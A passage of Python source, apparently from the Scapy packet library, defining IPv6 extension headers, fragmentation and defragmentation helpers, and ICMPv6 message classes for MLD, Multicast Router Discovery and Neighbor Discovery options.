                    ByteField("reserved", 0),
                    ByteField("flags", 0),
                    StrLenField("value", "", length_from=lambda pkt: pkt.len) ]

    def extract_padding(self, p):
        return b"",p

    registered_sr_tlv = {}
    @classmethod
    def register_variant(cls):
        cls.registered_sr_tlv[cls.type.default] = cls

    @classmethod
    def dispatch_hook(cls, pkt=None, *args, **kargs):
        if pkt:
            tmp_type = orb(pkt[0])
            return cls.registered_sr_tlv.get(tmp_type, cls)
        return cls


class IPv6ExtHdrSegmentRoutingTLVIngressNode(IPv6ExtHdrSegmentRoutingTLV):
    name = "IPv6 Option Header Segment Routing - Ingress Node TLV"
    fields_desc = [ ByteField("type", 1),
                    ByteField("len", 18),
                    ByteField("reserved", 0),
                    ByteField("flags", 0),
                    IP6Field("ingress_node", "::1") ]


class IPv6ExtHdrSegmentRoutingTLVEgressNode(IPv6ExtHdrSegmentRoutingTLV):
    name = "IPv6 Option Header Segment Routing - Egress Node TLV"
    fields_desc = [ ByteField("type", 2),
                    ByteField("len", 18),
                    ByteField("reserved", 0),
                    ByteField("flags", 0),
                    IP6Field("egress_node", "::1") ]


class IPv6ExtHdrSegmentRoutingTLVPadding(IPv6ExtHdrSegmentRoutingTLV):
    name = "IPv6 Option Header Segment Routing - Padding TLV"
    fields_desc = [ ByteField("type", 4),
                    FieldLenField("len", None, length_of="padding", fmt="B"),
                    StrLenField("padding", b"\x00", length_from=lambda pkt: pkt.len) ]


class IPv6ExtHdrSegmentRouting(_IPv6ExtHdr):
    name = "IPv6 Option Header Segment Routing"
    fields_desc = [ ByteEnumField("nh", 59, ipv6nh),
                    ByteField("len", None),
                    ByteField("type", 4),
                    ByteField("segleft", None),
                    ByteField("lastentry", None),
                    BitField("unused1", 0, 1),
                    BitField("protected", 0, 1),
                    BitField("oam", 0, 1),
                    BitField("alert", 0, 1),
                    BitField("hmac", 0, 1),
                    BitField("unused2", 0, 3),
                    ShortField("tag", 0),
                    IP6ListField("addresses", ["::1"],
                        count_from=lambda pkt: pkt.lastentry),
                    PacketListField("tlv_objects", [], IPv6ExtHdrSegmentRoutingTLV,
                        length_from=lambda pkt: 8*pkt.len - 16*pkt.lastentry) ]

    overload_fields = { IPv6: { "nh": 43 } }

    def post_build(self, pkt, pay):

        if self.len is None:

            # The extension must be align on 8 bytes
            tmp_mod = (len(pkt) - 8) % 8
            if tmp_mod == 1:
                warning("IPv6ExtHdrSegmentRouting(): can't pad 1 byte !")
            elif tmp_mod >= 2:
                #Add the padding extension
                tmp_pad = b"\x00" * (tmp_mod-2)
                tlv = IPv6ExtHdrSegmentRoutingTLVPadding(padding=tmp_pad)
                pkt += raw(tlv)

            tmp_len = (len(pkt) - 8) // 8
            pkt = pkt[:1] + struct.pack("B", tmp_len)+ pkt[2:]

        if self.segleft is None:
            tmp_len = len(self.addresses)
            if tmp_len:
                tmp_len -= 1
            pkt = pkt[:3] + struct.pack("B", tmp_len) + pkt[4:]

        if self.lastentry is None:
            pkt = pkt[:4] + struct.pack("B", len(self.addresses)) + pkt[5:]

        return _IPv6ExtHdr.post_build(self, pkt, pay) 


########################### Fragmentation Header ############################

class IPv6ExtHdrFragment(_IPv6ExtHdr):
    name = "IPv6 Extension Header - Fragmentation header"
    fields_desc = [ ByteEnumField("nh", 59, ipv6nh),
                    BitField("res1", 0, 8),
                    BitField("offset", 0, 13),
                    BitField("res2", 0, 2),
                    BitField("m", 0, 1),
                    IntField("id", None) ]
    overload_fields = {IPv6: { "nh": 44 }}


def defragment6(packets):
    """
    Performs defragmentation of a list of IPv6 packets. Packets are reordered.
    Crap is dropped. What lacks is completed by 'X' characters.
    """

    l = [x for x in packets if IPv6ExtHdrFragment in x] # remove non fragments
    if not l:
        return []

    id = l[0][IPv6ExtHdrFragment].id

    llen = len(l)
    l = [x for x in l if x[IPv6ExtHdrFragment].id == id]
    if len(l) != llen:
        warning("defragment6: some fragmented packets have been removed from list")
    llen = len(l)

    # reorder fragments
    res = []
    while l:
        min_pos = 0
        min_offset  = l[0][IPv6ExtHdrFragment].offset
        for p in l:
            cur_offset = p[IPv6ExtHdrFragment].offset
            if cur_offset < min_offset:
                min_pos = 0
                min_offset  = cur_offset
        res.append(l[min_pos])
        del(l[min_pos])

    # regenerate the fragmentable part
    fragmentable = b""
    for p in res:
        q=p[IPv6ExtHdrFragment]
        offset = 8*q.offset
        if offset != len(fragmentable):
            warning("Expected an offset of %d. Found %d. Padding with XXXX" % (len(fragmentable), offset))
        fragmentable += b"X"*(offset - len(fragmentable))
        fragmentable += raw(q.payload)

    # Regenerate the unfragmentable part.
    q = res[0]
    nh = q[IPv6ExtHdrFragment].nh
    q[IPv6ExtHdrFragment].underlayer.nh = nh
    del q[IPv6ExtHdrFragment].underlayer.payload
    q /= conf.raw_layer(load=fragmentable)

    return IPv6(raw(q))


def fragment6(pkt, fragSize):
    """
    Performs fragmentation of an IPv6 packet. Provided packet ('pkt') must already
    contain an IPv6ExtHdrFragment() class. 'fragSize' argument is the expected
    maximum size of fragments (MTU). The list of packets is returned.

    If packet does not contain an IPv6ExtHdrFragment class, it is returned in
    result list.
    """

    pkt = pkt.copy()

    if not IPv6ExtHdrFragment in pkt:
        # TODO : automatically add a fragment before upper Layer
        #        at the moment, we do nothing and return initial packet
        #        as single element of a list
        return [pkt]

    # If the payload is bigger than 65535, a Jumbo payload must be used, as
    # an IPv6 packet can't be bigger than 65535 bytes.
    if len(raw(pkt[IPv6ExtHdrFragment])) > 65535:
      warning("An IPv6 packet can'be bigger than 65535, please use a Jumbo payload.")
      return []

    s = raw(pkt) # for instantiation to get upper layer checksum right

    if len(s) <= fragSize:
        return [pkt]

    # Fragmentable part : fake IPv6 for Fragmentable part length computation
    fragPart = pkt[IPv6ExtHdrFragment].payload
    tmp = raw(IPv6(src="::1", dst="::1")/fragPart)
    fragPartLen = len(tmp) - 40  # basic IPv6 header length
    fragPartStr = s[-fragPartLen:]

    # Grab Next Header for use in Fragment Header
    nh = pkt[IPv6ExtHdrFragment].nh

    # Keep fragment header
    fragHeader = pkt[IPv6ExtHdrFragment]
    del fragHeader.payload # detach payload

    # Unfragmentable Part
    unfragPartLen = len(s) - fragPartLen - 8
    unfragPart = pkt
    del pkt[IPv6ExtHdrFragment].underlayer.payload # detach payload

    # Cut the fragmentable part to fit fragSize. Inner fragments have
    # a length that is an integer multiple of 8 octets. last Frag MTU
    # can be anything below MTU
    lastFragSize = fragSize - unfragPartLen - 8
    innerFragSize = lastFragSize - (lastFragSize % 8)

    if lastFragSize <= 0 or innerFragSize == 0:
        warning("Provided fragment size value is too low. " +
                "Should be more than %d" % (unfragPartLen + 8))
        return [unfragPart/fragHeader/fragPart]

    remain = fragPartStr
    res = []
    fragOffset = 0     # offset, incremeted during creation
    fragId = random.randint(0,0xffffffff) # random id ...
    if fragHeader.id is not None:  # ... except id provided by user
        fragId = fragHeader.id
    fragHeader.m = 1
    fragHeader.id = fragId
    fragHeader.nh = nh

    # Main loop : cut, fit to FRAGSIZEs, fragOffset, Id ...
    while True:
        if (len(remain) > lastFragSize):
            tmp = remain[:innerFragSize]
            remain = remain[innerFragSize:]
            fragHeader.offset = fragOffset    # update offset
            fragOffset += (innerFragSize // 8)  # compute new one
            if IPv6 in unfragPart:
                unfragPart[IPv6].plen = None
            tempo = unfragPart/fragHeader/conf.raw_layer(load=tmp)
            res.append(tempo)
        else:
            fragHeader.offset = fragOffset    # update offSet
            fragHeader.m = 0
            if IPv6 in unfragPart:
                unfragPart[IPv6].plen = None
            tempo = unfragPart/fragHeader/conf.raw_layer(load=remain)
            res.append(tempo)
            break
    return res


############################### AH Header ###################################

# class _AHFieldLenField(FieldLenField):
#     def getfield(self, pkt, s):
#         l = getattr(pkt, self.fld)
#         l = (l*8)-self.shift
#         i = self.m2i(pkt, s[:l])
#         return s[l:],i

# class _AHICVStrLenField(StrLenField):
#     def i2len(self, pkt, x):



# class IPv6ExtHdrAH(_IPv6ExtHdr):
#     name = "IPv6 Extension Header - AH"
#     fields_desc = [ ByteEnumField("nh", 59, ipv6nh),
#                     _AHFieldLenField("len", None, "icv"),
#                     ShortField("res", 0),
#                     IntField("spi", 0),
#                     IntField("sn", 0),
#                     _AHICVStrLenField("icv", None, "len", shift=2) ]
#     overload_fields = {IPv6: { "nh": 51 }}

#     def post_build(self, pkt, pay):
#         if self.len is None:
#             pkt = pkt[0]+struct.pack("!B", 2*len(self.addresses))+pkt[2:]
#         if self.segleft is None:
#             pkt = pkt[:3]+struct.pack("!B", len(self.addresses))+pkt[4:]
#         return _IPv6ExtHdr.post_build(self, pkt, pay)


############################### ESP Header ##################################

# class IPv6ExtHdrESP(_IPv6extHdr):
#     name = "IPv6 Extension Header - ESP"
#     fields_desc = [ IntField("spi", 0),
#                     IntField("sn", 0),
#                     # there is things to extract from IKE work
#                     ]
#     overloads_fields = {IPv6: { "nh": 50 }}



#############################################################################
#############################################################################
###                           ICMPv6* Classes                             ###
#############################################################################
#############################################################################

icmp6typescls = {    1: "ICMPv6DestUnreach",
                     2: "ICMPv6PacketTooBig",
                     3: "ICMPv6TimeExceeded",
                     4: "ICMPv6ParamProblem",
                   128: "ICMPv6EchoRequest",
                   129: "ICMPv6EchoReply",
                   130: "ICMPv6MLQuery",  # MLDv1 or MLDv2
                   131: "ICMPv6MLReport",
                   132: "ICMPv6MLDone",
                   133: "ICMPv6ND_RS",
                   134: "ICMPv6ND_RA",
                   135: "ICMPv6ND_NS",
                   136: "ICMPv6ND_NA",
                   137: "ICMPv6ND_Redirect",
                  #138: Do Me - RFC 2894 - Seems painful
                   139: "ICMPv6NIQuery",
                   140: "ICMPv6NIReply",
                   141: "ICMPv6ND_INDSol",
                   142: "ICMPv6ND_INDAdv",
                   143: "ICMPv6MLReport2",
                   144: "ICMPv6HAADRequest",
                   145: "ICMPv6HAADReply",
                   146: "ICMPv6MPSol",
                   147: "ICMPv6MPAdv",
                  #148: Do Me - SEND related - RFC 3971
                  #149: Do Me - SEND related - RFC 3971
                   151: "ICMPv6MRD_Advertisement",
                   152: "ICMPv6MRD_Solicitation",
                   153: "ICMPv6MRD_Termination",
                   }

icmp6typesminhdrlen = {    1: 8,
                           2: 8,
                           3: 8,
                           4: 8,
                         128: 8,
                         129: 8,
                         130: 24,
                         131: 24,
                         132: 24,
                         133: 8,
                         134: 16,
                         135: 24,
                         136: 24,
                         137: 40,
                         #139:
                         #140
                         141: 8,
                         142: 8,
                         143: 8,
                         144: 8,
                         145: 8,
                         146: 8,
                         147: 8,
                         151: 8,
                         152: 4,
                         153: 4
                   }

icmp6types = { 1 : "Destination unreachable",
               2 : "Packet too big",
               3 : "Time exceeded",
               4 : "Parameter problem",
             100 : "Private Experimentation",
             101 : "Private Experimentation",
             128 : "Echo Request",
             129 : "Echo Reply",
             130 : "MLD Query",
             131 : "MLD Report",
             132 : "MLD Done",
             133 : "Router Solicitation",
             134 : "Router Advertisement",
             135 : "Neighbor Solicitation",
             136 : "Neighbor Advertisement",
             137 : "Redirect Message",
             138 : "Router Renumbering",
             139 : "ICMP Node Information Query",
             140 : "ICMP Node Information Response",
             141 : "Inverse Neighbor Discovery Solicitation Message",
             142 : "Inverse Neighbor Discovery Advertisement Message",
             143 : "MLD Report Version 2",
             144 : "Home Agent Address Discovery Request Message",
             145 : "Home Agent Address Discovery Reply Message",
             146 : "Mobile Prefix Solicitation",
             147 : "Mobile Prefix Advertisement",
             148 : "Certification Path Solicitation",
             149 : "Certification Path Advertisement",
             151 : "Multicast Router Advertisement",
             152 : "Multicast Router Solicitation",
             153 : "Multicast Router Termination",
             200 : "Private Experimentation",
             201 : "Private Experimentation" }


class _ICMPv6(Packet):
    name = "ICMPv6 dummy class"
    overload_fields = {IPv6: {"nh": 58}}
    def post_build(self, p, pay):
        p += pay
        if self.cksum == None:
            chksum = in6_chksum(58, self.underlayer, p)
            p = p[:2]+struct.pack("!H", chksum)+p[4:]
        return p

    def hashret(self):
        return self.payload.hashret()

    def answers(self, other):
        # isinstance(self.underlayer, _IPv6ExtHdr) may introduce a bug ...
        if (isinstance(self.underlayer, IPerror6) or
            isinstance(self.underlayer, _IPv6ExtHdr) and
            isinstance(other, _ICMPv6)):
            if not ((self.type == other.type) and
                    (self.code == other.code)):
                return 0
            return 1
        return 0


class _ICMPv6Error(_ICMPv6):
    name = "ICMPv6 errors dummy class"
    def guess_payload_class(self,p):
        return IPerror6

class ICMPv6Unknown(_ICMPv6):
    name = "Scapy6 ICMPv6 fallback class"
    fields_desc = [ ByteEnumField("type",1, icmp6types),
                    ByteField("code",0),
                    XShortField("cksum", None),
                    StrField("msgbody", "")]


################################## RFC 2460 #################################

class ICMPv6DestUnreach(_ICMPv6Error):
    name = "ICMPv6 Destination Unreachable"
    fields_desc = [ ByteEnumField("type",1, icmp6types),
                    ByteEnumField("code",0, { 0: "No route to destination",
                                              1: "Communication with destination administratively prohibited",
                                              2: "Beyond scope of source address",
                                              3: "Address unreachable",
                                              4: "Port unreachable" }),
                    XShortField("cksum", None),
                    ByteField("length", 0),
                    X3BytesField("unused",0)]

class ICMPv6PacketTooBig(_ICMPv6Error):
    name = "ICMPv6 Packet Too Big"
    fields_desc = [ ByteEnumField("type",2, icmp6types),
                    ByteField("code",0),
                    XShortField("cksum", None),
                    IntField("mtu",1280)]

class ICMPv6TimeExceeded(_ICMPv6Error):
    name = "ICMPv6 Time Exceeded"
    fields_desc = [ ByteEnumField("type",3, icmp6types),
                    ByteEnumField("code",0, { 0: "hop limit exceeded in transit",
                                              1: "fragment reassembly time exceeded"}),
                    XShortField("cksum", None),
                    ByteField("length", 0),
                    X3BytesField("unused",0)]

# The default pointer value is set to the next header field of
# the encapsulated IPv6 packet
class ICMPv6ParamProblem(_ICMPv6Error):
    name = "ICMPv6 Parameter Problem"
    fields_desc = [ ByteEnumField("type",4, icmp6types),
                    ByteEnumField("code",0, {0: "erroneous header field encountered",
                                             1: "unrecognized Next Header type encountered",
                                             2: "unrecognized IPv6 option encountered"}),
                    XShortField("cksum", None),
                    IntField("ptr",6)]

class ICMPv6EchoRequest(_ICMPv6):
    name = "ICMPv6 Echo Request"
    fields_desc = [ ByteEnumField("type", 128, icmp6types),
                    ByteField("code", 0),
                    XShortField("cksum", None),
                    XShortField("id",0),
                    XShortField("seq",0),
                    StrField("data", "")]
    def mysummary(self):
        return self.sprintf("%name% (id: %id% seq: %seq%)")
    def hashret(self):
        return struct.pack("HH",self.id,self.seq)+self.payload.hashret()


class ICMPv6EchoReply(ICMPv6EchoRequest):
    name = "ICMPv6 Echo Reply"
    type = 129
    def answers(self, other):
        # We could match data content between request and reply.
        return (isinstance(other, ICMPv6EchoRequest) and
                self.id == other.id and self.seq == other.seq and
                self.data == other.data)


############ ICMPv6 Multicast Listener Discovery (RFC2710) ##################

# tous les messages MLD sont emis avec une adresse source lien-locale
# -> Y veiller dans le post_build si aucune n'est specifiee
# La valeur de Hop-Limit doit etre de 1
# "and an IPv6 Router Alert option in a Hop-by-Hop Options
# header. (The router alert option is necessary to cause routers to
# examine MLD messages sent to multicast addresses in which the router
# itself has no interest"
class _ICMPv6ML(_ICMPv6):
    fields_desc = [ ByteEnumField("type", 130, icmp6types),
                    ByteField("code", 0),
                    XShortField("cksum", None),
                    ShortField("mrd", 0),
                    ShortField("reserved", 0),
                    IP6Field("mladdr","::")]

# general queries are sent to the link-scope all-nodes multicast
# address ff02::1, with a multicast address field of 0 and a MRD of
# [Query Response Interval]
# Default value for mladdr is set to 0 for a General Query, and
# overloaded by the user for a Multicast Address specific query
# TODO : See what we can do to automatically include a Router Alert
#        Option in a Destination Option Header.
class ICMPv6MLQuery(_ICMPv6ML): # RFC 2710
    name = "MLD - Multicast Listener Query"
    type   = 130
    mrd    = 10000 # 10s for mrd
    mladdr = "::"
    overload_fields = {IPv6: { "dst": "ff02::1", "hlim": 1, "nh": 58}}


# TODO : See what we can do to automatically include a Router Alert
#        Option in a Destination Option Header.
class ICMPv6MLReport(_ICMPv6ML): # RFC 2710
    name = "MLD - Multicast Listener Report"
    type = 131
    overload_fields = {IPv6: {"hlim": 1, "nh": 58}}

    def answers(self, query):
        """Check the query type"""
        return ICMPv6MLQuery in query

# When a node ceases to listen to a multicast address on an interface,
# it SHOULD send a single Done message to the link-scope all-routers
# multicast address (FF02::2), carrying in its multicast address field
# the address to which it is ceasing to listen
# TODO : See what we can do to automatically include a Router Alert
#        Option in a Destination Option Header.
class ICMPv6MLDone(_ICMPv6ML): # RFC 2710
    name = "MLD - Multicast Listener Done"
    type = 132
    overload_fields = {IPv6: { "dst": "ff02::2", "hlim": 1, "nh": 58}}


############ Multicast Listener Discovery Version 2 (MLDv2) (RFC3810) #######

class ICMPv6MLQuery2(_ICMPv6): # RFC 3810
    name = "MLDv2 - Multicast Listener Query"
    fields_desc = [ ByteEnumField("type", 130, icmp6types),
                    ByteField("code", 0),
                    XShortField("cksum", None),
                    ShortField("mrd", 10000),
                    ShortField("reserved", 0),
                    IP6Field("mladdr","::"),
                    BitField("Resv", 0, 4),
                    BitField("S", 0, 1),
                    BitField("QRV", 0, 3),
                    ByteField("QQIC", 0),
                    ShortField("sources_number", None),
                    IP6ListField("sources", [],
                                 count_from=lambda pkt: pkt.sources_number) ]

    # RFC8810 - 4. Message Formats
    overload_fields = {IPv6: {"dst": "ff02::1", "hlim": 1 , "nh": 58}} 

    def post_build(self, packet, payload):
        """Compute the 'sources_number' field when needed"""
        if self.sources_number is None:
            srcnum = struct.pack("!H", len(self.sources))
            packet = packet[:26] + srcnum + packet[28:]
        return _ICMPv6.post_build(self, packet, payload)


class ICMPv6MLDMultAddrRec(Packet):
    name = "ICMPv6 MLDv2 - Multicast Address Record"
    fields_desc = [ ByteField("rtype", 4), 
                    FieldLenField("auxdata_len", None,
                                  length_of="auxdata",
                                  fmt="B"),
                    FieldLenField("sources_number", None,
                                  length_of="sources",
                                  adjust=lambda p,num: num//16),
                    IP6Field("dst", "::"),
                    IP6ListField("sources", [],
                                 length_from=lambda p: 16*p.sources_number),
                     StrLenField("auxdata", "",
                                 length_from=lambda p: p.auxdata_len) ]

    def default_payload_class(self, packet):
        """Multicast Address Record followed by another one"""
        return self.__class__


class ICMPv6MLReport2(_ICMPv6): # RFC 3810
    name = "MLDv2 - Multicast Listener Report"
    fields_desc = [ ByteEnumField("type", 143, icmp6types),
                    ByteField("res", 0),
                    XShortField("cksum", None),
                    ShortField("reserved", 0),
                    ShortField("records_number", None),
                    PacketListField("records", [],
                                    ICMPv6MLDMultAddrRec,
                                    count_from=lambda p: p.records_number) ]

    # RFC8810 - 4. Message Formats
    overload_fields = {IPv6: {"dst": "ff02::16", "hlim": 1 , "nh": 58}}

    def post_build(self, packet, payload):
        """Compute the 'records_number' field when needed"""
        if self.records_number is None:
            recnum = struct.pack("!H", len(self.records))
            packet = packet[:6] + recnum + packet[8:]
        return _ICMPv6.post_build(self, packet, payload)

    def answers(self, query):
        """Check the query type"""
        return isinstance(query, ICMPv6MLQuery2)


########## ICMPv6 MRD - Multicast Router Discovery (RFC 4286) ###############

# TODO:
# - 04/09/06 troglocan : find a way to automatically add a router alert
#            option for all MRD packets. This could be done in a specific
#            way when IPv6 is the under layer with some specific keyword
#            like 'exthdr'. This would allow to keep compatibility with
#            providing IPv6 fields to be overloaded in fields_desc.
#
#            At the moment, if user inserts an IPv6 Router alert option
#            none of the IPv6 default values of IPv6 layer will be set.

class ICMPv6MRD_Advertisement(_ICMPv6):
    name = "ICMPv6 Multicast Router Discovery Advertisement"
    fields_desc = [ByteEnumField("type", 151, icmp6types),
                   ByteField("advinter", 20),
                   XShortField("cksum", None),
                   ShortField("queryint", 0),
                   ShortField("robustness", 0)]
    overload_fields = {IPv6: { "nh": 58, "hlim": 1, "dst": "ff02::2"}}
                       # IPv6 Router Alert requires manual inclusion
    def extract_padding(self, s):
        return s[:8], s[8:]

class ICMPv6MRD_Solicitation(_ICMPv6):
    name = "ICMPv6 Multicast Router Discovery Solicitation"
    fields_desc = [ByteEnumField("type", 152, icmp6types),
                   ByteField("res", 0),
                   XShortField("cksum", None) ]
    overload_fields = {IPv6: { "nh": 58, "hlim": 1, "dst": "ff02::2"}}
                       # IPv6 Router Alert requires manual inclusion
    def extract_padding(self, s):
        return s[:4], s[4:]

class ICMPv6MRD_Termination(_ICMPv6):
    name = "ICMPv6 Multicast Router Discovery Termination"
    fields_desc = [ByteEnumField("type", 153, icmp6types),
                   ByteField("res", 0),
                   XShortField("cksum", None) ]
    overload_fields = {IPv6: { "nh": 58, "hlim": 1, "dst": "ff02::6A"}}
                       # IPv6 Router Alert requires manual inclusion
    def extract_padding(self, s):
        return s[:4], s[4:]


################### ICMPv6 Neighbor Discovery (RFC 2461) ####################

icmp6ndopts = { 1: "Source Link-Layer Address",
                2: "Target Link-Layer Address",
                3: "Prefix Information",
                4: "Redirected Header",
                5: "MTU",
                6: "NBMA Shortcut Limit Option", # RFC2491
                7: "Advertisement Interval Option",
                8: "Home Agent Information Option",
                9: "Source Address List",
               10: "Target Address List",
               11: "CGA Option",            # RFC 3971
               12: "RSA Signature Option",  # RFC 3971
               13: "Timestamp Option",      # RFC 3971
               14: "Nonce option",          # RFC 3971
               15: "Trust Anchor Option",   # RFC 3971
               16: "Certificate Option",    # RFC 3971
               17: "IP Address Option",                             # RFC 4068
               18: "New Router Prefix Information Option",          # RFC 4068
               19: "Link-layer Address Option",                     # RFC 4068
               20: "Neighbor Advertisement Acknowledgement Option",
               21: "CARD Request Option", # RFC 4065/4066/4067
               22: "CARD Reply Option",   # RFC 4065/4066/4067
               23: "MAP Option",          # RFC 4140
               24: "Route Information Option",  # RFC 4191
               25: "Recusive DNS Server Option",
               26: "IPv6 Router Advertisement Flags Option"
                }

icmp6ndoptscls = { 1: "ICMPv6NDOptSrcLLAddr",
                   2: "ICMPv6NDOptDstLLAddr",
                   3: "ICMPv6NDOptPrefixInfo",
                   4: "ICMPv6NDOptRedirectedHdr",
                   5: "ICMPv6NDOptMTU",
                   6: "ICMPv6NDOptShortcutLimit",
                   7: "ICMPv6NDOptAdvInterval",
                   8: "ICMPv6NDOptHAInfo",
                   9: "ICMPv6NDOptSrcAddrList",
                  10: "ICMPv6NDOptTgtAddrList",
                  #11: ICMPv6NDOptCGA, RFC3971 - contrib/send.py
                  #12: ICMPv6NDOptRsaSig, RFC3971 - contrib/send.py
                  #13: ICMPv6NDOptTmstp, RFC3971 - contrib/send.py
                  #14: ICMPv6NDOptNonce, RFC3971 - contrib/send.py
                  #15: Do Me,
                  #16: Do Me,
                  17: "ICMPv6NDOptIPAddr",
                  18: "ICMPv6NDOptNewRtrPrefix",
                  19: "ICMPv6NDOptLLA",
                  #18: Do Me,
                  #19: Do Me,
                  #20: Do Me,
                  #21: Do Me,
                  #22: Do Me,
                  23: "ICMPv6NDOptMAP",
                  24: "ICMPv6NDOptRouteInfo",
                  25: "ICMPv6NDOptRDNSS",
                  26: "ICMPv6NDOptEFA",
                  31: "ICMPv6NDOptDNSSL"
                  }

class _ICMPv6NDGuessPayload:
    name = "Dummy ND class that implements guess_payload_class()"
    def guess_payload_class(self,p):
        if len(p) > 1:
            return icmp6ndoptscls.get(orb(p[0]), Raw) # s/Raw/ICMPv6NDOptUnknown/g ?


# Beginning of ICMPv6 Neighbor Discovery Options.

class ICMPv6NDOptUnknown(_ICMPv6NDGuessPayload, Packet):
    name = "ICMPv6 Neighbor Discovery Option - Scapy Unimplemented"
    fields_desc = [ ByteField("type",None),
                    FieldLenField("len",None,length_of="data",fmt="B",
                                  adjust = lambda pkt,x: x+2),
                    StrLenField("data","",
                                length_from = lambda pkt: pkt.len-2) ]

# NOTE: len includes type and len field. Expressed in unit of 8 bytes
# TODO: Revoir le coup du ETHER_ANY
class ICMPv6NDOptSrcLLAddr(_ICMPv6NDGuessPayload, Packet):
    name = "ICMPv6 Neighbor Discovery Option - Source Link-Layer Address"
    fields_desc = [ ByteField("type", 1),
                    ByteField("len", 1),
                    MACField("lladdr", ETHER_ANY) ]
    def mysummary(self):
        return self.sprintf("%name% %lladdr%")

class ICMPv6NDOptDstLLAddr(ICMPv6NDOptSrcLLAddr):
    name = "ICMPv6 Neighbor Discovery Option - Destination Link-Layer Address"
    type = 2

class ICMPv6NDOptPrefixInfo(_ICMPv6NDGuessPayload, Packet):
    name = "ICMPv6 Neighbor Discovery Option - Prefix Information"
    fields_desc = [ ByteField("type",3),
                    ByteField("len",4),
                    ByteField("prefixlen",None),
                    BitField("L",1,1),
                    BitField("A",1,1),
                    BitField("R",0,1),
                    BitField("res1",0,5),
                    XIntField("validlifetime",0xffffffff),
                    XIntField("preferredlifetime",0xffffffff),
                    XIntField("res2",0x00000000),
                    IP6Field("prefix","::") ]
    def mysummary(self):
        return self.sprintf("%name% %prefix%")

# TODO: We should also limit the size of included packet to something
# like (initiallen - 40 - 2)
class TruncPktLenField(PacketLenField):
    __slots__ = ["cur_shift"]

    def __init__(self, name, default, cls, cur_shift, length_from=None, shift=0):
        PacketLenField.__init__(self, name, default, cls, length_from=length_from)
        self.cur_shift = cur_shift

    def getfield(self, pkt, s):
        l = self.length_from(pkt)
        i = self.m2i(pkt, s[:l])
        return s[l:],i

    def m2i(self, pkt, m):
        s = None
        try: # It can happen we have sth shorter than 40 bytes
            s = self.cls(m)
        except:
            return conf.raw_layer(m)
        return s

    def i2m(self, pkt, x):
        s = raw(x)
        l = len(s)
        r = (l + self.cur_shift) % 8
        l = l - r
        return s[:l]

    def i2len(self, pkt, i):
        return len(self.i2m(pkt, i))


# Faire un post_build pour le recalcul de la taille (en multiple de 8 octets)
class ICMPv6NDOptRedirectedHdr(_ICMPv6NDGuessPayload, Packet):
    name = "ICMPv6 Neighbor Discovery Option - Redirected Header"
    fields_desc = [ ByteField("type",4),
                    FieldLenField("len", None, length_of="pkt", fmt="B",
                                  adjust = lambda pkt,x:(x+8)//8),
                    StrFixedLenField("res", b"\x00"*6, 6),
                    TruncPktLenField("pkt", b"", IPv6, 8,
                                     length_from = lambda pkt: 8*pkt.len-8) ]

# See which value should be used for default MTU instead of 1280
class ICMPv6NDOptMTU(_ICMPv6NDGuessPayload, Packet):
    name = "ICMPv6 Neighbor Discovery Option - MTU"
    fields_desc = [ ByteField("type",5),
                    ByteField("len",1),
                    XShortField("res",0),
                    IntField("mtu",1280)]

class ICMPv6NDOptShortcutLimit(_ICMPv6NDGuessPayload, Packet): # RFC 2491
    name = "ICMPv6 Neighbor Discovery Option - NBMA Shortcut Limit"
    fields_desc = [ ByteField("type", 6),
                    ByteField("len", 1),
                    ByteField("shortcutlim", 40), # XXX
                    ByteField("res1", 0),
                    IntField("res2", 0) ]

class ICMPv6NDOptAdvInterval(_ICMPv6NDGuessPayload, Packet):
    name = "ICMPv6 Neighbor Discovery - Interval Advertisement"
    fields_desc = [ ByteField("type",7),
                    ByteField("len",1),
                    ShortField("res", 0),
                    IntField("advint", 0) ]
    def mysummary(self):
        return self.sprintf("%name% %advint% milliseconds")

class ICMPv6NDOptHAInfo(_ICMPv6NDGuessPayload, Packet):
    name = "ICMPv6 Neighbor Discovery - Home Agent Information"
    fields_desc = [ ByteField("type",8),
                    ByteField("len",1),
                    ShortField("res", 0),
                    ShortField("pref", 0),
                    ShortField("lifetime", 1)]
    def mysummary(self):
        return self.sprintf("%name% %pref% %lifetime% seconds")

# type 9  : See ICMPv6NDOptSrcAddrList class below in IND (RFC 3122) support

# type 10 : See ICMPv6NDOptTgtAddrList class below in IND (RFC 3122) support

class ICMPv6NDOptIPAddr(_ICMPv6NDGuessPayload, Packet):  # RFC 4068
    name = "ICMPv6 Neighbor Discovery - IP Address Option (FH for MIPv6)"
    fields_desc = [ ByteField("type",17),
                    ByteField("len", 3),
                    ByteEnumField("optcode", 1, {1: "Old Care-Of Address",
                                                 2: "New Care-Of Address",
                                                 3: "NAR's IP address" }),
                    ByteField("plen", 64),
                    IntField("res", 0),
                    IP6Field("addr", "::") ]

class ICMPv6NDOptNewRtrPrefix(_ICMPv6NDGuessPayload, Packet): # RFC 4068
    name = "ICMPv6 Neighbor Discovery - New Router Prefix Information Option (FH for MIPv6)"
    fields_desc = [ ByteField("type",18),
                    ByteField("len", 3),
                    ByteField("optcode", 0),
                    ByteField("plen", 64),
                    IntField("res", 0),
                    IP6Field("prefix", "::") ]

_rfc4068_lla_optcode = {0: "Wildcard requesting resolution for all nearby AP",
                        1: "LLA for the new AP",
                        2: "LLA of the MN",
                        3: "LLA of the NAR",
                        4: "LLA of the src of TrSolPr or PrRtAdv msg",
                        5: "AP identified by LLA belongs to current iface of router",
                        6: "No preifx info available for AP identified by the LLA",
                        7: "No fast handovers support for AP identified by the LLA" }

class ICMPv6NDOptLLA(_ICMPv6NDGuessPayload, Packet):     # RFC 4068
    name = "ICMPv6 Neighbor Discovery - Link-Layer Address (LLA) Option (FH for MIPv6)"
    fields_desc = [ ByteField("type", 19),
                    ByteField("len", 1),
                    ByteEnumField("optcode", 0, _rfc4068_lla_optcode),
                    MACField("lla", ETHER_ANY) ] # We only support ethernet

class ICMPv6NDOptMAP(_ICMPv6NDGuessPayload, Packet):     # RFC 4140
    name = "ICMPv6 Neighbor Discovery - MAP Option"
    fields_desc = [ ByteField("type", 23),
                    ByteField("len", 3),
                    BitField("dist", 1, 4),
                    BitField("pref", 15, 4), # highest availability
                    BitField("R", 1, 1),
                    BitField("res", 0, 7),
                    IntField("validlifetime", 0xffffffff),
                    IP6Field("addr", "::") ]


class _IP6PrefixField(IP6Field):
    __slots__ = ["length_from"]
    def __init__(self, name, default):
        IP6Field.__init__(self, name, default)
        self.length_from = lambda pkt: 8*(pkt.len - 1)

    def addfield(self, pkt, s, val):
        return s + self.i2m(pkt, val)

    def getfield(self, pkt, s):
        l = self.length_from(pkt)
        p = s[:l]
        if l < 16:
